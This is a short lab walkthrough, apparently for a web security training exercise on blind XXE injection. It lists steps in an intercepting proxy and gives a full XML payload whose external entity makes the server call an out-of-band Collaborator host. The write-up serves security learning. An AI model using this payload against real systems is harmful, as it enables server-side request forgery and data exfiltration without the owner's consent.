@@ -1,0 +1,14 @@
+Blind XXE injection with out-of-band interaction
+Goal: Exploit the blind XXE vulnerability and perform a DNS lookup and HTTP request to Burp Collaborator
+
+1)
+-Click a product
+-Click check stock
+-Send Post to repeater
+-https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#ssrf
+-open collaborator
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://9dnc8owypxwigjus0kzigadcm3sugk49.oastify.com">]>
+<stockCheck><productId>
+&xxe;
+</productId><storeId>1</storeId></stockCheck>
